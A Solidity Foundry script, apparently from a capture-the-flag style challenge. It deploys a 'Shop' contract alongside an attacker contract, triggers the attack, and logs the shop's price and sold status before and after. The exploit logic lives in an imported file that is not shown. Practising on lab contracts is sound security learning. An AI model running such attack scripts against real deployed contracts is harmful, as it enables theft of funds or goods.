// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {Shop} from "../src/Shop.sol";
import {Attacker} from "../src/ShopAttacker.sol";
import {DeployAttackScript} from "../script/Deploy.s.sol";

contract AttackScript is Script {
    Shop public shop;
    Attacker public attacker;

    function run() public {
        DeployAttackScript deployAttackScript = new DeployAttackScript();
        (shop, attacker) = deployAttackScript.run();
        attack();
    }

    function attack() public {
        
        vm.startBroadcast();
        console.log("Attack Balance:", shop.price());
        console.log("Attack Balance:", shop.isSold());

        attacker.attack();

        console.log("Attack Balance:", shop.price());
        console.log("Attack Balance:", shop.isSold());

        vm.stopBroadcast();

    }
}
